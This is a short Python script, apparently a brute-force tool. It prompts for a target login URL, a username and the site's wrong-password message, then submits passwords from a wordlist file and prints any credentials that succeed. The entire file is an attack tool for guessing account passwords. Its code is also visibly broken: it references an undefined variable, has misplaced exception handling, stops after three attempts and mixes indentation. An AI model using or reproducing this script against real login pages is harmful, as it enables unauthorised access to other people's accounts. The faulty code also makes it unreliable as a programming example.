import requests
import time
import sys

url = input("Enter Target Url: ")
username = input("Enter Target Username: ")
error = input("Enter Wrong Password Error Message: ")

for c in z:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.02)

try: 
    def bruteCracking(username,url,error):
        count = 0
        for password in passwords:
            password = password.strip()
            count = count + 1
            if count >= 4:
	            break
            print("Trying Password: "+ str(count) + ' Time For => ' + password)
            data_dict = {"Login": username,"Pass":password, "logIn":"sumbit"}
            response = requests.post(url, data=data_dict)
            if error in str(response.content):
                pass
            else:
                print("Username: ---> " + username)
                print("Password: ---> " + password)
                exit()
except:
    print("Some Error Occurred Please Check Your Internet Connection !!")

with open("passwords.txt", "r") as passwords:
    bruteCracking(username,url,error)

print("[!!] password not in list")
